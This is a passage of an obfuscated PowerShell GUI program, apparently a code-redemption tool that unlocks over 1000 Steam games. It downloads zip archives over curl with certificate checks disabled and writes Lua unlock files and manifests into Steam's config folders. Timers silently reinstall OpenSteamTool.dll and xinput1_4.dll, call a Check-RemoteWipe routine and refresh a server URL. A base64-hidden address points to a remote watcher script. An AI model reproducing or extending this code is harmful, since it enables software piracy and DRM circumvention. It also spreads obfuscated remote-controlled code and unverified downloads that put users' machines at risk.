                if ((Get-Item (Join-Path $tmp $m)).Length -gt 100) { Copy-Item -LiteralPath (Join-Path $tmp $m) -Destination (Join-Path $manDir $m) -Force; $manCount++ }
            } catch { $errs+="$m fallo" }
        }
    } catch { $errs+=$_.Exception.Message }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    return @{ ok=($luaOk -and $manCount -gt 0); lua=$luaOk; manifest=$manCount; err=($errs -join "; ") }
}

function Gg4Zs {
    param([string]$fixName, [hashtable]$games)
    $clean = $fixName -replace '(?i)\s*(UB|Ubisoft)?\s*(Bypass|Fix|Patch|Fix)\s*$', ''
    $clean = $clean -replace '(?i)\s*\(\d+\)\s*$', ''
    $clean = $clean -replace '_', ' '
    $clean = $clean.Trim()
    $fn = Nn1Yw $clean
    $fnWords = @($fn -split '\s+' | Where-Object { $_.Length -gt 0 })
    $bestMatch = $null; $bestScore = 0
    foreach ($g in $games.Keys) {
        $gfn = Nn1Yw $g
        $maxLen = [Math]::Max($fn.Length, $gfn.Length)
        $minLen = [Math]::Min($fn.Length, $gfn.Length)
        if ($fn -eq $gfn) { return $games[$g], $g }
        if ($fn -like "*$gfn*" -or $gfn -like "*$fn*") {
            $shorter = if ($fn.Length -le $gfn.Length) { $fn } else { $gfn }
            $longer = if ($fn.Length -gt $gfn.Length) { $fn } else { $gfn }
            if ($minLen -ge $maxLen * 0.6) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
            elseif ($shorter -notmatch '\s' -and $longer.EndsWith($shorter)) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
        $gWords = @($gfn -split '\s+' | Where-Object { $_.Length -gt 0 })
        $common = 0
        foreach ($w in $fnWords) {
            foreach ($gw in $gWords) {
                if ($w -eq $gw) { $common++; break }
                if ($w -like "*$gw*" -or $gw -like "*$w*") { $common += 0.5; break }
            }
        }
        $total = [Math]::Max($fnWords.Count, $gWords.Count)
        if ($total -gt 0) {
            $ratio = $common / $total
            if ($ratio -ge 0.4 -and $ratio -gt $bestScore) { $bestScore = $ratio; $bestMatch = $g }
        }
        if ($maxLen -gt 3) {
            $dist = Gl9Dz $fn $gfn
            $threshold = [Math]::Max(1, [Math]::Floor($maxLen * 0.2))
            if ($dist -le $threshold) { $score = $maxLen - $dist; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
    }
    if ($bestMatch) { return $games[$bestMatch], $bestMatch }
    return $null, $null
}


$script:cdX = $null
$script:cdT = $null

function ScD {
    param([int]$durationSec, [datetime]$expDate, [string]$gameName)
    if ($script:cdT) { $script:cdT.Stop(); $script:cdT.Dispose() }
    $script:cdT = New-Object System.Windows.Forms.Timer
    $script:cdT.Interval = 1000
    $script:cdT.Tag = @{ endTime = $expDate; gameName = $gameName }
    $script:cdT.Add_Tick({
        try {
            $now, $_ = Get-Now; $end = $this.Tag.endTime; $g = $this.Tag.gameName
            $left = ($end - $now).TotalSeconds
            if ($left -le 0) {
                $this.Stop()
                $script:cdX = $null
                try { Rm9xExp | Out-Null } catch {}
                [System.Windows.Forms.MessageBox]::Show("El tiempo para $g ha expirado.", (S("VGllbXBvIEV4cGlyYWRv")), "OK", "Information")
            }
        } catch {}
    })
    $script:cdT.Start()
}


$script:lastPatchCheck = Get-Date
$script:rfT = New-Object System.Windows.Forms.Timer
$script:rfT.Interval = 10000
$script:rfT.Add_Tick({
    try { Rm9xExp | Out-Null } catch {}
    try { Rp6Mi } catch {}
    try { ScA } catch {}
    try { RfC } catch {}
    try {
        if (((Get-Date) - $script:lastPatchCheck).TotalMinutes -ge 5) {
            $script:lastPatchCheck = Get-Date
            $sr=$null; try { $sr=Get-SteamPath } catch {}
            if ($sr -and -not ((Test-Path (Join-Path $sr "OpenSteamTool.dll")) -and (Test-Path (Join-Path $sr "xinput1_4.dll")))) {
                try { $null = Xz9Qk -Silent } catch {}
            }
        }
    } catch {}
    try { Check-RemoteWipe } catch {}
})
$script:rfT.Start()


$script:clpTicker = New-Object System.Windows.Forms.Timer
$script:clpTicker.Interval = 1000
$script:clpTicker.Add_Tick({
    if ($script:rp -and $script:rp.Visible -and $script:clp) { $script:clp.Invalidate() }
    if ($script:cdp -and $script:cdp.Visible -and -not $script:cdRunning) { try { Update-CdPanelText } catch {} }
})
$script:clpTicker.Start()


$script:urlChecker = New-Object System.Windows.Forms.Timer
$script:urlChecker.Interval = 30000
$script:urlChecker.Add_Tick({ try { Update-ServerUrl } catch {} })
$script:urlChecker.Start()


$script:fixesCacheTime = (Get-Date).AddDays(-1)
$script:fixesCache = @{}
$script:fixesJob = $null
$script:fixedNewGames = @{}
$script:fixJobs = @{}
$script:steamLibsCacheTime = Get-Date
$script:downloadPendingFixes = @{}
$script:knownDownloading = @{}
$script:commonFolderCache = @{}
${script:watcherUrl} = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4vZG93bmxvYWRfd2F0Y2hlci5wczE=")

$script:langs = @{
    "es" = @{ activar=(S("QWN0aXZhciArMTAwMA=="));activarSub="Activa mas de 1000 juegos"
        idioma="Idioma";idiomaSub="Cambiar idioma";desinstalar=(S("RGVzaW5zdGFsYXI="));desinstalarSub=(S("RWxpbWluYXIganVlZ29z"))
        web="Pagina Web";webSub="Visitar sitio oficial"
        config="Configuracion";configSub="Ajustes del programa";reparadorOn=(S("UmVwYXJhZG9yOiBBQ1RJVkFETw=="));reparadorOff=(S("UmVwYXJhZG9yOiBERVNBQ1RJVkFETw=="))
        borrarHist=(S("Qm9ycmFyIGhpc3RvcmlhbCBkZSBjb2RpZ29z"));borrarHistSub=(S("RWxpbWluYSBlbCByZWdpc3RybyBkZSBjb2RpZ29zIGFjdGl2b3M="))
        limpieza=(S("TElNUElFWkE="));limpiezaSub="Restablece el programa a su estado inicial"
        histBorrado=(S("SGlzdG9yaWFsIGJvcnJhZG8="));histBorradoMsg=(S("U2UgZWxpbWluYXJvbiB0b2RvcyBsb3MgY29kaWdvcyBhY3Rpdm9zIGRlbCByZWdpc3Ryby4="))
        discord=(S("RGlzY29yZA=="));discordSub="Unite a nuestro servidor";tiktok="TikTok";tiktokSub="Seguinos en TikTok"
        salir="Salir";canjear=(S("Q2FuamVhciBDb2RpZ28="));canjearSub=(S("SW5ncmVzYSB0dSBjb2RpZ28gcGFyYSBkZXNibG9xdWVhciBqdWVnb3M="))
        canjearBtn=(S("Q2FuamVhcg=="));pegarBtn="Pegar";volver="Volver";codigosActivos=(S("Q29kaWdvcyBBY3Rpdm9z"))
        sinCodigos=(S("Tm8gaGF5IGNvZGlnb3MgYWN0aXZvcw=="));sinCodigosSub=(S("SW5ncmVzYSB1biBjb2RpZ28gYXJyaWJhIHBhcmEgYWN0aXZhciBqdWVnb3M="))
        errorCodigo=(S("SW5ncmVzYSB1biBjb2RpZ28gdmFsaWRvLg=="));verificando=(S("VmVyaWZpY2FuZG8gY29kaWdvLi4u"))
        exito=(S("Q29kaWdvIGNhbmplYWRvIGV4aXRvc2FtZW50ZSE="));expirado=(S("RVhQSVJBRE8="));activo="ACTIVO"
        expiraEn=(S("RVhQSVJBIEVO"));dias="DIAS";dia="DIA";expira=(S("RXhwaXJhOg=="));juegoAct="Juego activado"
        selectIdioma="Seleccionar Idioma";proximamente="Proximamente." }
    "en" = @{ activar="Activate +1000";activarSub="Activate over 1000 games"
        idioma="Language";idiomaSub="Change language";desinstalar="Uninstall";desinstalarSub="Remove games"
        web="Website";webSub="Visit official site"
        config="Settings";configSub="Program settings";reparadorOn="Repairer: ON";reparadorOff="Repairer: OFF"
        borrarHist="Clear codes history";borrarHistSub="Remove active code records"
        limpieza="CLEANUP";limpiezaSub="Reset the program to its initial state"
        histBorrado="History cleared";histBorradoMsg="All active codes have been removed from the registry."
        discord=(S("RGlzY29yZA=="));discordSub="Join our server";tiktok="TikTok";tiktokSub="Follow us on TikTok"
        salir="Exit";canjear="Redeem Code";canjearSub="Enter your code to unlock games"
        canjearBtn="Redeem";pegarBtn="Paste";volver="Back";codigosActivos="Active Codes"
        sinCodigos="No active codes";sinCodigosSub="Enter a code above to activate games"
        errorCodigo="Enter a valid code.";verificando="Verifying code..."
        exito="Code redeemed successfully!";expirado="EXPIRED";activo="ACTIVE"
        expiraEn="EXPIRES IN";dias="DAYS";dia="DAY";expira="Expires:";juegoAct="Game activated"
        selectIdioma="Select Language";proximamente="Coming soon." }
    "pt" = @{ activar="Ativar +1000";activarSub="Ative mais de 1000 jogos"
        idioma="Idioma";idiomaSub="Mudar idioma";desinstalar=(S("RGVzaW5zdGFsYXI="));desinstalarSub="Remover jogos"
        web="Pagina Web";webSub="Visitar site oficial"
        config="Configuracoes";configSub="Ajustes do programa";reparadorOn=(S("UmVwYXJhZG9yOiBBVElWQURP"));reparadorOff=(S("UmVwYXJhZG9yOiBERVNBVElWQURP"))
        borrarHist=(S("TGltcGFyIGhpc3RvcmljbyBkZSBjb2RpZ29z"));borrarHistSub=(S("UmVtb3ZlIHJlZ2lzdHJvcyBkZSBjb2RpZ29zIGF0aXZvcw=="))
        limpieza="LIMPEZA";limpiezaSub="Restaura o programa ao estado inicial"
        histBorrado="Historico limpo";histBorradoMsg=(S("VG9kb3Mgb3MgY29kaWdvcyBhdGl2b3MgZm9yYW0gcmVtb3ZpZG9zIGRvIHJlZ2lzdHJvLg=="))
        discord=(S("RGlzY29yZA=="));discordSub="Entre no nosso servidor";tiktok="TikTok";tiktokSub="Siga-nos no TikTok"
        salir="Sair";canjear=(S("UmVzZ2F0YXIgQ29kaWdv"));canjearSub=(S("SW5zaXJhIHNldSBjb2RpZ28gcGFyYSBkZXNibG9xdWVhciBqb2dvcw=="))
        canjearBtn="Resgatar";pegarBtn="Colar";volver="Voltar";codigosActivos=(S("Q29kaWdvcyBBdGl2b3M="))
        sinCodigos=(S("TmVuaHVtIGNvZGlnbyBhdGl2bw=="));sinCodigosSub=(S("SW5zaXJhIHVtIGNvZGlnbyBhY2ltYSBwYXJhIGF0aXZhciBqb2dvcw=="))
        errorCodigo=(S("SW5zaXJhIHVtIGNvZGlnbyB2YWxpZG8u"));verificando=(S("VmVyaWZpY2FuZG8gY29kaWdvLi4u"))
        exito=(S("Q29kaWdvIHJlc2dhdGFkbyBjb20gc3VjZXNzbyE="));expirado=(S("RVhQSVJBRE8="));activo="ATIVO"
        expiraEn=(S("RVhQSVJBIEVN"));dias="DIAS";dia="DIA";expira=(S("RXhwaXJhOg=="));juegoAct="Jogo ativado"
        selectIdioma="Selecionar Idioma";proximamente="Em breve." }
}
$script:currentLang = "es"
function T([string]$k){ return $script:langs[$script:currentLang][$k] }




$script:BG=[System.Drawing.Color]::FromArgb(11,15,25)
$script:CardBG=[System.Drawing.Color]::FromArgb(18,24,38)
$script:CardHover=[System.Drawing.Color]::FromArgb(25,33,52)
$script:CardBorder=[System.Drawing.Color]::FromArgb(32,48,68)
$script:InputBG=[System.Drawing.Color]::FromArgb(14,18,30)
$script:White=[System.Drawing.Color]::White
$script:Gray=[System.Drawing.Color]::FromArgb(130,142,162)
$script:Green=[System.Drawing.Color]::FromArgb(60,220,100)
$script:Cyan=[System.Drawing.Color]::FromArgb(0,180,230)
$script:PegarBtnBG=[System.Drawing.Color]::FromArgb(30,40,58)
$script:PegarBtnBGH=[System.Drawing.Color]::FromArgb(40,55,78)
$script:Yellow=[System.Drawing.Color]::FromArgb(255,210,0)
$script:Orange=[System.Drawing.Color]::FromArgb(255,160,40)
$script:Red=[System.Drawing.Color]::FromArgb(255,70,70)
$script:TikPink=[System.Drawing.Color]::FromArgb(254,44,85)
$script:TikCyan=[System.Drawing.Color]::FromArgb(37,244,238)
$script:DiscordBlue=[System.Drawing.Color]::FromArgb(88,101,242)
$script:GreenBtn=[System.Drawing.Color]::FromArgb(45,200,100)
$script:GreenBtnH=[System.Drawing.Color]::FromArgb(35,175,85)

$script:FntTitle=New-Object System.Drawing.Font("Bahnschrift SemiBold",24,[System.Drawing.FontStyle]::Bold)
$script:FntAct=New-Object System.Drawing.Font("Bahnschrift Light",10)
$script:FntCard=New-Object System.Drawing.Font("Bahnschrift SemiBold",12,[System.Drawing.FontStyle]::Bold)
$script:FntSub=New-Object System.Drawing.Font("Segoe UI",8.5)
$script:FntArrow=New-Object System.Drawing.Font("Segoe UI",14,[System.Drawing.FontStyle]::Bold)
$script:FntSalir=New-Object System.Drawing.Font("Bahnschrift SemiBold",11,[System.Drawing.FontStyle]::Bold)
$script:FntSect=New-Object System.Drawing.Font("Bahnschrift SemiBold",13,[System.Drawing.FontStyle]::Bold)
$script:FntCodeT=New-Object System.Drawing.Font("Bahnschrift SemiBold",9.5,[System.Drawing.FontStyle]::Bold)
$script:FntCodeS=New-Object System.Drawing.Font("Segoe UI",8)
$script:FntCodeSt=New-Object System.Drawing.Font("Bahnschrift",7.5,[System.Drawing.FontStyle]::Bold)
$script:FntBack=New-Object System.Drawing.Font("Bahnschrift SemiBold",10,[System.Drawing.FontStyle]::Bold)
$script:FntRedeemTitle=New-Object System.Drawing.Font("Bahnschrift SemiBold",14,[System.Drawing.FontStyle]::Bold)
$script:FntSubmit=New-Object System.Drawing.Font("Bahnschrift SemiBold",9.5,[System.Drawing.FontStyle]::Bold)

$script:activeCodes=[System.Collections.ArrayList]@()

$script:LOTEQ_FILE = Join-Path $env:LOCALAPPDATA "BastissSteam\bsmap_lote_queue.json"
$script:cdPaused = $false
$script:cdStop = $false
$script:cdRunning = $false
$script:cdCode = $null
$script:clpGroups = @()

$script:cdPct = 0
$script:cdEtaSec = -1
$script:cdStatus = ""
$script:cdBar = $null
$script:cdRunDone = 0
$script:cdRunTotal = 0

function Format-Eta([double]$sec) {
    if ($sec -lt 0 -or [double]::IsNaN($sec) -or [double]::IsInfinity($sec)) { return "--:--" }
    $s = [int][math]::Round($sec)
    if ($s -ge 3600) { return ("{0}:{1:00}:{2:00}" -f [int][math]::Floor($s/3600), [int][math]::Floor(($s%3600)/60), ($s%60)) }
    return ("{0:00}:{1:00}" -f [int][math]::Floor($s/60), ($s%60))
}
function Update-CdProgress([int]$done, [int]$total, [string]$game, [double]$etaSec, [bool]$paused) {
    $script:cdRunDone = $done
    $script:cdRunTotal = $total
    if ($total -gt 0) { $script:cdPct = [int][math]::Floor(100 * $done / $total) } else { $script:cdPct = 0 }
    $script:cdEtaSec = $etaSec
    $script:cdStatus = [string]$game
    if ($script:cdInfo) { $script:cdInfo.Text = [string]$game }
    if ($script:cdProg) {
        try {
            if ($paused) {
                $script:cdProg.ForeColor = $script:Yellow
                $script:cdProg.Text = "$($script:cdPct)%   |   Faltan ~$(Format-Eta $etaSec)"
            } elseif ($game -eq 'Listo') {
                $script:cdProg.ForeColor = $script:Green
                $script:cdProg.Text = "100%   |   Completado ($done/$total)"
            } elseif ($game -match 'fallidos') {
                $script:cdProg.ForeColor = $script:Orange
                $script:cdProg.Text = "$($script:cdPct)%"
            } else {
                $script:cdProg.ForeColor = $script:Cyan
                $etaTxt = if ($etaSec -ge 0) { "Faltan ~$(Format-Eta $etaSec)" } else { "Calculando..." }
                $script:cdProg.Text = "$($script:cdPct)%   |   $etaTxt"
            }
        } catch {}
    }
    if ($script:cdBar -and -not $script:cdBar.IsDisposed) { try { $script:cdBar.Invalidate() } catch {} }
}

function Get-LoteQueue {
    try {
        if (Test-Path -LiteralPath $script:LOTEQ_FILE) {
            $j = Get-Content -LiteralPath $script:LOTEQ_FILE -Raw | ConvertFrom-Json
            return @($j)
        }
    } catch {}
    return @()
}
function Save-LoteQueue($q) {
    try {
        $dir = Split-Path -Parent $script:LOTEQ_FILE
        if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        [System.IO.File]::WriteAllText($script:LOTEQ_FILE, (ConvertTo-Json -InputObject @($q) -Depth 8), (New-Object System.Text.UTF8Encoding $false))
    } catch {}
}
function Get-LoteJob([string]$code) {
    $q = Get-LoteQueue
    foreach ($e in $q) { if ([string]$e.code -eq $code) { return $e } }
    return $null
}
function Set-LoteJob($job) {
    $q = @(Get-LoteQueue)
    $out = @()
    $found = $false
    foreach ($e in $q) {
        if ([string]$e.code -eq [string]$job.code) { $out += $job; $found = $true } else { $out += $e }
    }
    if (-not $found) { $out += $job }
    Save-LoteQueue $out
}
function New-LoteJob([string]$code, $links, [int]$duration, $expiresAt, [string]$steamRoot) {
    $items = @()
    foreach ($l in @($links)) { $items += @{ url=[string]$l; status='pending'; game=''; lua=@(); man=@() } }
    $expStr = ""
    if ($expiresAt) { $expStr = $expiresAt.ToString('o') }
    return @{ code=$code; links=@($links); items=$items; duration=$duration; expires_at=$expStr; steam_root=$steamRoot; paused=$false; created=(Get-Date).ToString('o') }
}
function Mark-LoteDone([string]$code, [string]$url, $lua, $man, [string]$game) {
    try {
        $job = Get-LoteJob $code
        if (-not $job) { return }
        foreach ($it in @($job.items)) {
            if ([string]$it.url -eq $url) { $it.status='done'; $it.game=$game; $it.lua=@($lua); $it.man=@($man) }
        }
        Set-LoteJob $job
    } catch {}
}
function Reset-LoteJobPending([string]$code) {
    try {
        $job = Get-LoteJob $code
        if (-not $job) { return }
        foreach ($it in @($job.items)) { $it.status='pending'; $it.lua=@(); $it.man=@() }
        $job.paused = $false
        Set-LoteJob $job
    } catch {}
}
function Get-JobPendingCount([string]$code) {
    try {
        $job = Get-LoteJob $code
        if (-not $job) { return 0 }
        return @($job.items | Where-Object { $_.status -ne 'done' }).Count
    } catch { return 0 }
}

function Install-LoteItem([string]$url, [string]$steamRoot, $expDate, [string]$code, [string]$gameName) {
    $zipFile = Join-Path $env:TEMP ("fix_" + [System.Guid]::NewGuid().ToString('N') + ".zip")
    try {
        Bn6Lc $url $zipFile
        $res = Extract-AndInstall $zipFile $gameName $expDate $code
        return @{ ok=$true; lua=@($res.lua); man=@($res.manifest); err="" }
    } catch {
        return @{ ok=$false; lua=@(); man=@(); err=$_.Exception.Message }
    } finally {
        Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
    }
}

$script:LOTE_INSTALL_SCRIPT = {
    param($url, $steamRoot, $gName, $expDate, $codeStr)
    $res = @{ ok=$false; err=""; lua=@(); man=@(); game=$gName }
    try {
        $zip = Join-Path $env:TEMP ("fix_" + [System.Guid]::NewGuid().ToString('N') + ".zip")
        & curl.exe -s -k -L --ssl-no-revoke -H "User-Agent: Mozilla/5.0" -o $zip $url --max-time 300
        if ($LASTEXITCODE -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500) { throw "descarga fallida: $url" }
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $tmpExp = Join-Path $env:TEMP ("par_" + [System.Guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpExp -Force | Out-Null
        [IO.Compression.ZipFile]::ExtractToDirectory($zip, $tmpExp)
        $luaDir = Join-Path $steamRoot "config\stplug-in"
        $luaDir2 = Join-Path $steamRoot "config\lua"
        $manDir = Join-Path $steamRoot "config\depotcache"
        $manRoot = Join-Path $steamRoot "depotcache"
        foreach ($d in @($luaDir,$luaDir2,$manDir,$manRoot)) { if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null } }
        $luas = @(Get-ChildItem $tmpExp -Recurse -Filter *.lua | ForEach-Object { $_.Name })
        $mans = @(Get-ChildItem $tmpExp -Recurse -Filter *.manifest | ForEach-Object { $_.Name })
        $header = ""
        if ($gName -and $expDate) {
            $header = "-- BSMAP_EXPIRES:$($expDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gName`n"
            if ($mans.Count -gt 0) { $header += "-- BSMAP_MANIFESTS:$($mans -join ',')`n" }
            if ($codeStr) { $header += "-- BSMAP_CODE:$codeStr`n" }
        }
        foreach ($f in Get-ChildItem $tmpExp -Recurse -Filter *.lua) {
            $dst1 = Join-Path $luaDir $f.Name; $dst2 = Join-Path $luaDir2 $f.Name
            if ($header) { try { $c = [IO.File]::ReadAllText($f.FullName); [IO.File]::WriteAllText($dst1, $header+$c, (New-Object System.Text.UTF8Encoding $false)); [IO.File]::WriteAllText($dst2, $header+$c, (New-Object System.Text.UTF8Encoding $false)) } catch { Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force } }
            else { Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force }
        }
        foreach ($f in Get-ChildItem $tmpExp -Recurse -Filter *.manifest) { Copy-Item $f.FullName (Join-Path $manDir $f.Name) -Force; Copy-Item $f.FullName (Join-Path $manRoot $f.Name) -Force }
        Remove-Item $tmpExp -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        $res.ok = $true; $res.lua = $luas; $res.man = $mans
    } catch { $res.err = $_.Exception.Message; $res.ok = $false }
    return $res
}

function Invoke-LoteItemBlocking([string]$url, [string]$steamRoot, $expDate, [string]$code, [string]$gameName) {
    $pool = $null; $ps = $null
    try {
        $pool = [RunspaceFactory]::CreateRunspacePool(1, 1)
        $pool.Open()
        $ps = [PowerShell]::Create()
        $ps.RunspacePool = $pool
        [void]$ps.AddScript($script:LOTE_INSTALL_SCRIPT).AddArgument($url).AddArgument($steamRoot).AddArgument($gameName).AddArgument($expDate).AddArgument($code)
        $h = $ps.BeginInvoke()
        while (-not $h.IsCompleted -and -not $script:cdStop) {
            try { [System.Windows.Forms.Application]::DoEvents() } catch {}
            Start-Sleep -Milliseconds 60
        }
        if ($script:cdStop -and -not $h.IsCompleted) { try { $ps.Stop() } catch {}; return @{ ok=$false; lua=@(); man=@(); err="cancelado" } }
        $out = $ps.EndInvoke($h)
        if ($out -and @($out).Count -gt 0 -and $out[0]) { return $out[0] }
        return @{ ok=$false; lua=@(); man=@(); err="sin resultado" }
    } catch {
        return @{ ok=$false; lua=@(); man=@(); err=$_.Exception.Message }
    } finally {
        try { if ($ps) { $ps.Dispose() } } catch {}
        try { if ($pool) { $pool.Close(); $pool.Dispose() } } catch {}
    }
}

function Add-TimerForLote([string]$code, [int]$duration, $expDate, [string]$steamRoot, [string]$game, $lua, $man) {
    try {
        $timerExp = $expDate
        if (-not $timerExp) { $timerExp = (Get-Date).AddYears(1) }
        $timers = At5Vc
        $internetNow, $netOk = Get-InternetTime
        if (-not $internetNow) { $internetNow = Get-Date }
        $iNow = $internetNow.ToString('o')
        $timers += @{ redeem_code=$code; duration=$duration; expires_at=$timerExp.ToString('o'); internet_created_at=$iNow; game_name=$game; steam_root=$steamRoot; lua_files=@($lua); manifest_files=@($man) }
        St7Xb $timers
        $script:activeCodes.Add(@{Code=$code;Game=$game;ActivatedAt=(Get-Date);ExpiresAt=$timerExp;Duration=$duration;InternetCreatedAt=$iNow}) | Out-Null
    } catch {}
}

function Invoke-LoteQueueForCode([string]$code, $label) {
    if ($script:cdRunning) { return }
    $job = Get-LoteJob $code
    if (-not $job) { return }
    $script:cdRunning = $true
    $script:cdStop = $false
    $script:cdPaused = $false
    try {
        $steamRoot = [string]$job.steam_root
        if (-not $steamRoot) { try { $steamRoot = Get-SteamPath } catch { $steamRoot = "" } }
        $expDate = $null
        if ($job.expires_at) { try { $expDate = [datetime]::Parse([string]$job.expires_at) } catch {} }
        $duration = 0; try { $duration = [int]$job.duration } catch {}
        $total = @($job.items).Count
        $done = @($job.items | Where-Object { $_.status -eq 'done' }).Count
        $errors = 0
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        $startDone = $done
        Update-CdProgress $done $total "" -1 $false
        $pendItems = @($job.items | Where-Object { $_.status -ne 'done' })
        $maxC = [Math]::Min([Math]::Max($pendItems.Count, 1), 6)
        $iNow = ""
        try { $netT, $nOk = Get-InternetTime; if ($netT) { $iNow = $netT.ToString('o') } } catch {}
        if (-not $iNow) { $iNow = (Get-Date).ToString('o') }
        $timersMem = New-Object System.Collections.ArrayList
        foreach ($t in @(At5Vc)) { [void]$timersMem.Add($t) }
        $lastFlush = Get-Date
        $pool = $null
        $queue = @()
        try {
            $pool = [RunspaceFactory]::CreateRunspacePool(1, $maxC)
            $pool.Open()
            $idx = 0
            while (($idx -lt $pendItems.Count -or $queue.Count -gt 0) -and -not $script:cdStop) {
                if (-not $script:cdPaused) {
                    while ($queue.Count -lt $maxC -and $idx -lt $pendItems.Count) {
                        $it = $pendItems[$idx]; $idx++
                        $gName = [System.IO.Path]::GetFileNameWithoutExtension(($it.url -split '/')[-2])
                        if ($gName) { $gName = $gName -replace '%[0-9a-fA-F]{2}', '' }
                        $ps = [PowerShell]::Create()
                        $ps.RunspacePool = $pool
                        [void]$ps.AddScript($script:LOTE_INSTALL_SCRIPT).AddArgument([string]$it.url).AddArgument($steamRoot).AddArgument($gName).AddArgument($expDate).AddArgument($code)
                        $queue += @{ ps=$ps; handle=$ps.BeginInvoke(); item=$it; game=$gName; url=[string]$it.url }
                    }
                }
                $finished = @($queue | Where-Object { $_.handle.IsCompleted })
                foreach ($q in $finished) {
                    $res = $null
                    try {
                        $r = $q.ps.EndInvoke($q.handle)
                        if ($r) { foreach ($x in @($r)) { if ($x -and $null -ne $x.ok) { $res = $x; break } } }
                    } catch {}
                    if (-not $res) { $res = @{ ok=$false; lua=@(); man=@(); err="sin resultado" } }
                    if ($res.ok) {
                        $q.item.status='done'; $q.item.game=$q.game; $q.item.lua=@($res.lua); $q.item.man=@($res.man)
                        $done++
                        $timerExp = $expDate
                        if (-not $timerExp) { $timerExp = (Get-Date).AddYears(1) }
                        [void]$timersMem.Add(@{ redeem_code=$code; duration=$duration; expires_at=$timerExp.ToString('o'); internet_created_at=$iNow; game_name=$q.game; steam_root=$steamRoot; lua_files=@($res.lua); manifest_files=@($res.man) })
                        try { $script:activeCodes.Add(@{Code=$code;Game=$q.game;ActivatedAt=(Get-Date);ExpiresAt=$timerExp;Duration=$duration;InternetCreatedAt=$iNow}) | Out-Null } catch {}
                    } else {
                        $q.item.status='failed'
                        $errors++
                        try { WEL "Download $($q.game)" $res.err } catch {}
                    }
                    try { $q.ps.Dispose() } catch {}
                    $queue = @($queue | Where-Object { $_.handle -ne $q.handle })
                    try { RfC } catch {}
                }
                if (((Get-Date) - $lastFlush).TotalMilliseconds -ge 1200) {
                    try { Set-LoteJob $job } catch {}
                    try { St7Xb $timersMem.ToArray() } catch {}
                    $lastFlush = Get-Date
                }
                $didR = $done - $startDone
                $eta = -1
                if ($didR -gt 0) { $eta = ($sw.Elapsed.TotalSeconds / $didR) * ($total - $done) }
                $active = $queue.Count
                if ($script:cdPaused) {
                    Update-CdProgress $done $total "PAUSADO   |   $done/$total  (Reanudar para seguir)" $eta $true
                } else {
                    Update-CdProgress $done $total "Activando $active en paralelo ($done/$total)" $eta $false
                }
                try { [System.Windows.Forms.Application]::DoEvents() } catch {}
                Start-Sleep -Milliseconds 50
            }
            foreach ($q in $queue) { try { $q.ps.Stop() } catch {}; try { $q.ps.Dispose() } catch {} }
            $queue = @()
        } finally {
            try { if ($pool) { $pool.Close(); $pool.Dispose() } } catch {}
        }
        $sw.Stop()
        try { Set-LoteJob $job } catch {}
        try { St7Xb $timersMem.ToArray() } catch {}
        $job = Get-LoteJob $code
        if ($job) { $job.paused=$false; Set-LoteJob $job }
        if ($done -ge $total -and $errors -eq 0) {
            Update-CdProgress $done $total "Listo" 0 $false
            if ($duration -gt 0 -and $expDate) { try { ScD $duration $expDate $code } catch {} }
        } elseif ($errors -gt 0) {
            Update-CdProgress $done $total "$done/$total activados ($errors fallidos)" -1 $false
        } else {
            Update-CdProgress $done $total "Pausado" -1 $false
        }
        if ($done -ge $total -and $errors -eq 0) {
            if ($script:cdInfo) { $script:cdInfo.Text = "$(Format-Juegos $total) activados" }
            if ($label -and -not $label.IsDisposed) { $label.ForeColor=$script:Green; $label.Text="Listo - $(Format-Juegos $total) activados" }
        } elseif ($errors -gt 0) {
            if ($script:cdInfo) { $script:cdInfo.Text = "Activacion con fallos ($done/$total, $errors fallidos)" }
            if ($label -and -not $label.IsDisposed) { $label.ForeColor=$script:Orange; $label.Text="$done/$total activados ($errors fallidos)" }
        } else {
            if ($script:cdInfo) { $script:cdInfo.Text = "Pausado ($done/$total)" }
            if ($label -and -not $label.IsDisposed) { $label.ForeColor=$script:Yellow; $label.Text="Pausado - $done/$total" }
        }
    } finally {
        $script:cdRunning = $false
        $script:cdPaused = $false
        try { RfC } catch {}
    }
}

function Remove-GamesForCode([string]$code) {
    $timers = At5Vc
    $rest = @()
    $removed = 0
    foreach ($t in $timers) {
        if ([string]$t.redeem_code -eq $code) {
            try {
                $root = [string]$t.steam_root
                foreach ($f in @($t.lua_files)) { Remove-FileHard (Join-Path (Join-Path $root "config\stplug-in") $f); Remove-FileHard (Join-Path (Join-Path $root "config\lua") $f) }
                foreach ($f in @($t.manifest_files)) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) }
                $removed++
            } catch {}
        } else { $rest += $t }
    }
    St7Xb $rest
    try { $script:activeCodes.RemoveAll({ param($c) [string]$c.Code -eq $code }) | Out-Null } catch {}
    Reset-LoteJobPending $code
    try { RfC } catch {}
    return $removed
}

function Get-ActiveCodeGroups {
    $g = @{}
    foreach ($c in @($script:activeCodes)) {
        $k = [string]$c.Code
        if (-not $k) { continue }
        if (-not $g.ContainsKey($k)) { $g[$k] = @{ Code=$k; Games=0; ExpiresAt=$null; Duration=0; ActivatedAt=$null; Pending=0 } }
        $e = $g[$k]
        $e.Games = $e.Games + 1
        try { if ($null -ne $c.Duration) { $e.Duration = [int]$c.Duration } } catch {}
